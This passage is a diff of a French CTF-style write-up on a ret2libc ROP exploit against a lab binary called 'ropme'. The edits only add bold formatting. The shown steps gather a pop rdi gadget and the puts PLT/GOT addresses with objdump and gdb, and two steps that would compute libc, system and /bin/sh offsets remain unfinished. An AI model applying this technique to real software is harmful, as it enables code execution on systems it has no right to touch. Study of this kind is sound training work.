@@ -333,27 +333,27 @@ _TL;DR_ :
 Pour notre exploitation nous avons besoin de :
 
 1. L'adresse du gadget `pop rdi ; ret` dans le code que nous avons déjà récupéré avec ROPgadget.
-2. L'adresse de puts dans la PLT :
+2. L'adresse de **puts** dans la **PLT** :
 ```py
 ❯ objdump -D ropme -M intel | grep '<puts@plt>'
 00000000004004e0 <puts@plt>:
   40063a:	e8 a1 fe ff ff       	call   4004e0 <puts@plt>
 ```
-3. L'adresse de puts dans la GOT :
+3. L'adresse de **puts** dans la **GOT** :
 ```py
 ❯ objdump -R ropme | grep 'puts'
 0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
 ```
-4. L'adresse de main dans le code :
+4. L'adresse de **main** dans le code :
 ```py
 gef➤  p main
 $2 = {<text variable, no debug info>} 0x400626 <main>
 ```
-5. L'adresse de puts, dans la libc utilisé pour calculer l'adresse de la base de la libc :
+5. L'adresse de **puts** dans la **libc utilisé**, pour calculer l'adresse de la base de la libc :
 ```py
 coming...
 ```
-6. L'adresse de system et /bin/sh pour calculer l'écart avec la base :
+6. L'adresse de **system** et **/bin/sh** pour calculer l'écart avec la base :
 ```py
 coming...
 ```
